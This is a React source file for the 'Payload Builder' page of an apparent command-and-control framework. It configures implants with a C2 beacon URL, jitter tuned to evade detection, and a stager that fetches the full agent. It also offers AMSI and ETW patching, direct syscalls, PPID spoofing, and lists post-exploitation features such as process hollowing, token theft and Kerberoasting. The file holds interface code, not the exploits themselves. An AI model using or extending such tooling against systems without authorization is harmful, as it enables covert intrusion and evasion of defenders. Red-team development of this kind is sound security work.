import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Download, Package, CheckCircle, AlertCircle, Loader, Shield, Calendar, Layers } from "lucide-react";
import { api } from "../api/client";

const PLATFORMS = [
  { id: "linux-amd64",   label: "Linux",   sub: "x86_64",       icon: "🐧" },
  { id: "linux-arm64",   label: "Linux",   sub: "ARM64",         icon: "🐧" },
  { id: "darwin-amd64",  label: "macOS",   sub: "Intel",         icon: "🍎" },
  { id: "darwin-arm64",  label: "macOS",   sub: "Apple Silicon", icon: "🍎" },
  { id: "windows-amd64", label: "Windows", sub: "x86_64",        icon: "🪟" },
];

const JITTER_MODES = [
  { id: "linear",     label: "Linear",      desc: "Uniform random variance" },
  { id: "gaussian",   label: "Gaussian",    desc: "Normal distribution — natural looking" },
  { id: "sinusoidal", label: "Sinusoidal",  desc: "Slow sine wave — avoids uniform intervals" },
  { id: "burst",      label: "Burst",       desc: "3 fast then 1 long — evades pattern detection" },
];

type BuildState = "idle" | "building" | "done" | "error";

interface Profile { name: string; description: string; }

export default function Builder() {
  const [c2url, setC2url]         = useState("http://127.0.0.1:8000");
  const [platform, setPlatform]   = useState("linux-amd64");
  const [sleep, setSleep]         = useState(5);
  const [jitter, setJitter]       = useState(1);
  const [jitterMode, setJitterMode] = useState("linear");
  const [state, setState]         = useState<BuildState>("idle");
  const [error, setError]         = useState("");
  const [filename, setFilename]   = useState("");
  const [obfuscate, setObfuscate] = useState(false);
  const [profile, setProfile]     = useState("default");
  const [profiles, setProfiles]   = useState<Profile[]>([]);
  const [killDate, setKillDate]   = useState("");
  const [buildStager, setBuildStager] = useState(false);
  const [enableAmsi, setEnableAmsi]   = useState(false);
  const [enableEtw, setEnableEtw]     = useState(false);
  const [enablePpid, setEnablePpid]   = useState(false);
  const [ppidTarget, setPpidTarget]   = useState("explorer.exe");
  const [enableSleepMask, setEnableSleepMask] = useState(false);
  const [enableSyscalls, setEnableSyscalls]   = useState(false);

  useEffect(() => {
    api.get<Profile[]>("/api/profiles/").then(r => setProfiles(r.data)).catch(() => {});
  }, []);

  const build = async () => {
    setState("building"); setError("");
    try {
      const token = localStorage.getItem("nyx_token");
      const res = await fetch("http://localhost:8000/api/builder/build", {
        method: "POST",
        headers: { "Content-Type": "application/json", Authorization: `Bearer ${token}` },
        body: JSON.stringify({
          c2_url: c2url, platform, sleep, jitter,
          obfuscate, profile, kill_date: killDate,
          jitter_mode: jitterMode, build_stager: buildStager,
          enable_amsi: enableAmsi, enable_etw: enableEtw,
          enable_ppid: enablePpid, ppid_target: ppidTarget,
          enable_sleep_mask: enableSleepMask, enable_syscalls: enableSyscalls,
        }),
      });
      if (!res.ok) {
        const err = await res.json();
        throw new Error(err.detail ?? "Build failed");
      }
      const blob = await res.blob();
      const ext  = platform.startsWith("windows") ? ".exe" : "";
      const name = buildStager ? `nyx-stager-${platform}${ext}` : `nyx-agent-${platform}${ext}`;
      setFilename(name);
      const url = URL.createObjectURL(blob);
      const a   = document.createElement("a");
      a.href = url; a.download = name; a.click();
      URL.revokeObjectURL(url);
      setState("done");
      setTimeout(() => setState("idle"), 4000);
    } catch (e: any) {
      setError(e.message);
      setState("error");
    }
  };

  const Toggle = ({ value, onChange, label, desc }: { value: boolean; onChange: () => void; label: string; desc: string }) => (
    <div className="flex items-center gap-3 p-3 rounded-xl" style={{ background: "#F8F6F1", border: "1px solid #E5DDD0" }}>
      <motion.button onClick={onChange}
        className="relative w-9 h-5 rounded-full flex-shrink-0 transition-colors"
        style={{ background: value ? "#1E3CB8" : "#C5C9D4" }}
        whileTap={{ scale: 0.95 }}>
        <motion.div animate={{ x: value ? 16 : 2 }} transition={{ type: "spring", stiffness: 500, damping: 30 }}
          className="absolute top-0.5 w-4 h-4 rounded-full bg-white" style={{ boxShadow: "0 1px 3px rgba(0,0,0,0.2)" }} />
      </motion.button>
      <div>
        <p className="text-nyx-text text-xs font-semibold">{label}</p>
        <p className="text-nyx-muted text-xs mt-0.5">{desc}</p>
      </div>
    </div>
  );

  return (
    <div className="p-7 space-y-6 bg-nyx-bg min-h-full">
      <motion.div initial={{ opacity: 0, y: -8 }} animate={{ opacity: 1, y: 0 }} transition={{ duration: 0.3 }}>
        <h1 className="text-nyx-text text-2xl font-bold tracking-tight" style={{ fontFamily: "Bricolage Grotesque, sans-serif", letterSpacing: "-0.02em" }}>Payload Builder</h1>
        <p className="text-nyx-muted text-sm mt-1">Compile a custom agent with your C2 URL embedded</p>
      </motion.div>

      <div className="grid grid-cols-3 gap-6">
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.1 }}
          className="col-span-2 bg-white rounded-2xl p-6 space-y-5" style={{ border: "1px solid #E5DDD0", boxShadow: "0 1px 4px rgba(0,0,0,0.04)" }}>

          {/* C2 URL */}
          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>C2 Server URL</label>
            <input value={c2url} onChange={e => setC2url(e.target.value)}
              className="input-base w-full rounded-xl px-4 py-3 text-sm mono"
              placeholder="https://your-server.com" />
            <p className="text-nyx-muted text-xs mt-1.5">The agent beacons back to this URL</p>
          </div>

          {/* Platform */}
          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-3 uppercase" style={{ letterSpacing: "0.08em" }}>Target Platform</label>
            <div className="grid grid-cols-5 gap-2">
              {PLATFORMS.map(p => (
                <motion.button key={p.id} onClick={() => setPlatform(p.id)}
                  whileHover={{ y: -2 }} whileTap={{ scale: 0.97 }}
                  className="flex flex-col items-center gap-1.5 py-3 px-2 rounded-xl text-xs font-medium transition-all"
                  style={platform === p.id
                    ? { background: "#EEF1FB", border: "1px solid rgba(30,60,184,0.25)", color: "#1E3CB8" }
                    : { background: "#F8F6F1", border: "1px solid #E5DDD0", color: "#8C95A8" }
                  }>
                  <span className="text-lg">{p.icon}</span>
                  <span>{p.label}</span>
                  <span style={{ fontSize: "10px", color: "#8C95A8" }}>{p.sub}</span>
                </motion.button>
              ))}
            </div>
          </div>

          {/* Sleep / Jitter */}
          <div className="grid grid-cols-2 gap-4">
            <div>
              <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>Sleep (seconds)</label>
              <input type="number" value={sleep} onChange={e => setSleep(+e.target.value)}
                className="input-base w-full rounded-xl px-4 py-3 text-sm mono" min={1} max={3600} />
            </div>
            <div>
              <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>Jitter (seconds)</label>
              <input type="number" value={jitter} onChange={e => setJitter(+e.target.value)}
                className="input-base w-full rounded-xl px-4 py-3 text-sm mono" min={0} max={60} />
            </div>
          </div>

          {/* Jitter Mode */}
          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>
              Jitter Mode
            </label>
            <div className="grid grid-cols-4 gap-2">
              {JITTER_MODES.map(m => (
                <motion.button key={m.id} onClick={() => setJitterMode(m.id)}
                  whileTap={{ scale: 0.97 }}
                  className="flex flex-col gap-1 p-2.5 rounded-xl text-left"
                  style={jitterMode === m.id
                    ? { background: "#EEF1FB", border: "1px solid rgba(30,60,184,0.25)" }
                    : { background: "#F8F6F1", border: "1px solid #E5DDD0" }
                  }>
                  <span className="text-xs font-semibold" style={{ color: jitterMode === m.id ? "#1E3CB8" : "#0C0F1A" }}>{m.label}</span>
                  <span className="text-nyx-muted" style={{ fontSize: "10px", lineHeight: "1.3" }}>{m.desc}</span>
                </motion.button>
              ))}
            </div>
          </div>

          {/* C2 Profile */}
          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>
              <span className="flex items-center gap-1.5"><Layers size={11} /> C2 Traffic Profile</span>
            </label>
            <select value={profile} onChange={e => setProfile(e.target.value)}
              className="input-base w-full rounded-xl px-4 py-3 text-sm"
              style={{ appearance: "none" }}>
              {profiles.map(p => (
                <option key={p.name} value={p.name}>{p.name} — {p.description}</option>
              ))}
            </select>
            <p className="text-nyx-muted text-xs mt-1.5">Shapes HTTP traffic to mimic a legitimate service</p>
          </div>

          {/* Kill Date */}
          <div>
            <label className="block text-nyx-dim text-xs font-semibold mb-2 uppercase" style={{ letterSpacing: "0.08em" }}>
              <span className="flex items-center gap-1.5"><Calendar size={11} /> Kill Date (optional)</span>
            </label>
            <input type="date" value={killDate} onChange={e => setKillDate(e.target.value)}
              className="input-base w-full rounded-xl px-4 py-3 text-sm mono" />
            <p className="text-nyx-muted text-xs mt-1.5">Agent self-terminates after this date</p>
          </div>

          {/* Payload Options */}
          <div className="space-y-2">
            <Toggle value={obfuscate} onChange={() => setObfuscate(v => !v)}
              label="XOR String Obfuscation"
              desc="Hides C2 URL from static analysis — unique XOR key per build" />
            <Toggle value={buildStager} onChange={() => setBuildStager(v => !v)}
              label="Build Stager Instead"
              desc="Minimal first-stage loader — downloads full agent from C2 on execution" />
          </div>

          {/* EDR Evasion — Windows only */}
          <div>
            <div className="flex items-center gap-2 mb-3">
              <div className="w-5 h-px flex-1" style={{ background: "#E5DDD0" }} />
              <span className="text-nyx-muted text-xs font-semibold uppercase" style={{ letterSpacing: "0.08em" }}>
                EDR Evasion · Windows
              </span>
              <div className="w-5 h-px flex-1" style={{ background: "#E5DDD0" }} />
            </div>
            <div className="space-y-2">
              <Toggle value={enableAmsi} onChange={() => setEnableAmsi(v => !v)}
                label="AMSI Bypass"
                desc="Patches AmsiScanBuffer on startup — PowerShell/script scanning disabled" />
              <Toggle value={enableEtw} onChange={() => setEnableEtw(v => !v)}
                label="ETW Patching"
                desc="Patches EtwEventWrite — blinds EDR telemetry channel" />
              <Toggle value={enableSleepMask} onChange={() => setEnableSleepMask(v => !v)}
                label="Sleep Masking"
                desc="XOR-encrypts sensitive strings in memory while agent sleeps" />
              <Toggle value={enableSyscalls} onChange={() => setEnableSyscalls(v => !v)}
                label="Hell's Gate (Direct Syscalls)"
                desc="Resolves NT syscall numbers from ntdll — bypasses EDR API hooks" />
              <Toggle value={enablePpid} onChange={() => setEnablePpid(v => !v)}
                label="PPID Spoofing"
                desc="Spawned processes appear as children of a trusted parent process" />
              {enablePpid && (
                <div className="pl-12">
                  <label className="block text-nyx-muted text-xs mb-1.5">Parent process name</label>
                  <input value={ppidTarget} onChange={e => setPpidTarget(e.target.value)}
                    className="input-base w-full rounded-xl px-3 py-2 text-xs mono"
                    placeholder="explorer.exe" />
                </div>
              )}
            </div>
          </div>

          {/* Phase 3: Advanced Post-Exploitation */}
          <div>
            <div className="flex items-center gap-2 mb-3">
              <div className="w-5 h-px flex-1" style={{ background: "#E5DDD0" }} />
              <span className="text-nyx-muted text-xs font-semibold uppercase" style={{ letterSpacing: "0.08em" }}>
                Post-Exploitation · v0.8.0
              </span>
              <div className="w-5 h-px flex-1" style={{ background: "#E5DDD0" }} />
            </div>
            <div className="rounded-xl p-3 space-y-2" style={{ background: "#F8F6F1", border: "1px solid #E5DDD0" }}>
              <p className="text-nyx-muted text-xs font-medium mb-2">Capabilities compiled into this agent:</p>
              {[
                ["Process Hollowing",       "hollow / hollow-pe — inject shellcode or PE into a suspended process"],
                ["Token Impersonation",     "token-steal/make/revert/spawn — steal or forge Windows access tokens"],
                ["BOF / COFF Loader",       "bof — execute Beacon Object Files in-process (CS-compatible)"],
                ["Reflective DLL",          "refdll — map a DLL from memory without touching disk"],
                ["Kerberoasting",           "kerb-roast <SPN> — extract TGS hash for offline cracking"],
                ["AS-REP Roasting",         "asrep-roast <user> <domain> <dc> — extract AS-REP hash"],
              ].map(([name, desc]) => (
                <div key={name} className="flex items-start gap-2">
                  <div className="w-1.5 h-1.5 rounded-full mt-1.5 flex-shrink-0" style={{ background: "#1E3CB8" }} />
                  <div>
                    <span className="text-nyx-text text-xs font-semibold">{name}</span>
                    <span className="text-nyx-muted text-xs"> — {desc}</span>
                  </div>
                </div>
              ))}
            </div>
          </div>

          <motion.button onClick={build} disabled={state === "building"}
            whileHover={{ scale: 1.01, boxShadow: "0 6px 24px rgba(30,60,184,0.28)" }}
            whileTap={{ scale: 0.98 }}
            className="btn-primary w-full py-3.5 rounded-xl text-sm flex items-center justify-center gap-2">
            {state === "building"
              ? <><motion.span animate={{ rotate: 360 }} transition={{ duration: 1, repeat: Infinity, ease: "linear" }}><Loader size={15} /></motion.span> Building…</>
              : <><Package size={15} /> {buildStager ? "Build Stager" : "Build Agent"}</>
            }
          </motion.button>
        </motion.div>

        {/* Right panel */}
        <motion.div initial={{ opacity: 0, y: 12 }} animate={{ opacity: 1, y: 0 }} transition={{ delay: 0.18 }}
          className="space-y-4">
          <AnimatePresence>
            {state === "done" && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0, scale: 0.95 }}
                className="bg-white rounded-2xl p-4 flex items-start gap-3" style={{ border: "1px solid rgba(10,107,74,0.2)" }}>
                <CheckCircle size={16} className="text-nyx-green mt-0.5 flex-shrink-0" />
                <div>
                  <div className="text-nyx-text text-sm font-semibold">Build successful</div>
                  <div className="mono text-nyx-muted text-xs mt-0.5">{filename}</div>
                </div>
              </motion.div>
            )}
            {state === "error" && (
              <motion.div initial={{ opacity: 0, scale: 0.95 }} animate={{ opacity: 1, scale: 1 }} exit={{ opacity: 0 }}
                className="bg-white rounded-2xl p-4 flex items-start gap-3" style={{ border: "1px solid rgba(184,40,40,0.2)" }}>
                <AlertCircle size={16} className="text-nyx-red mt-0.5 flex-shrink-0" />
                <div>
                  <div className="text-nyx-red text-sm font-semibold">Build failed</div>
                  <div className="text-nyx-muted text-xs mt-0.5">{error}</div>
                </div>
              </motion.div>
            )}
          </AnimatePresence>

          {/* Deploy guide */}
          <div className="bg-white rounded-2xl p-5 space-y-3" style={{ border: "1px solid #E5DDD0" }}>
            <div className="text-nyx-text text-sm font-semibold flex items-center gap-2">
              <Download size={14} className="text-nyx-accent" /> Deploy
            </div>
            <div className="space-y-2">
              {[
                ["1. Build",    "Configure and click Build"],
                ["2. Transfer", "Copy binary to target machine"],
                ["3. Execute",  "Run with appropriate permissions"],
                ["4. Monitor",  "Agent appears in the Agents tab"],
              ].map(([step, desc]) => (
                <div key={step} className="flex gap-3">
                  <span className="text-xs font-semibold text-nyx-accent mono w-14 flex-shrink-0 pt-0.5">{step}</span>
                  <span className="text-nyx-muted text-xs">{desc}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Build summary */}
          <div className="bg-white rounded-2xl p-5 space-y-2" style={{ border: "1px solid #E5DDD0" }}>
            <div className="text-nyx-text text-sm font-semibold mb-3 flex items-center gap-2">
              <Shield size={13} className="text-nyx-accent" /> Build Summary
            </div>
            {[
              ["Platform",    PLATFORMS.find(p => p.id === platform)?.label + " " + PLATFORMS.find(p => p.id === platform)?.sub],
              ["Profile",     profile],
              ["Jitter Mode", jitterMode],
              ["Sleep",       `${sleep}s ± ${jitter}s`],
              ["Kill Date",   killDate || "None"],
              ["Obfuscate",   obfuscate ? "XOR (per-build key)" : "No"],
              ["Type",        buildStager ? "Stager" : "Full Agent"],
              ["AMSI Bypass", enableAmsi ? "✓" : "—"],
              ["ETW Patch",   enableEtw ? "✓" : "—"],
              ["Sleep Mask",  enableSleepMask ? "✓" : "—"],
              ["Syscalls",    enableSyscalls ? "Hell's Gate" : "—"],
              ["PPID Spoof",  enablePpid ? ppidTarget : "—"],
            ].map(([k, v]) => (
              <div key={k} className="flex justify-between items-center py-1.5 border-b border-nyx-border last:border-0">
                <span className="text-nyx-muted text-xs font-medium">{k}</span>
                <span className="mono text-nyx-dim text-xs truncate max-w-32">{v}</span>
              </div>
            ))}
          </div>
        </motion.div>
      </div>
    </div>
  );
}
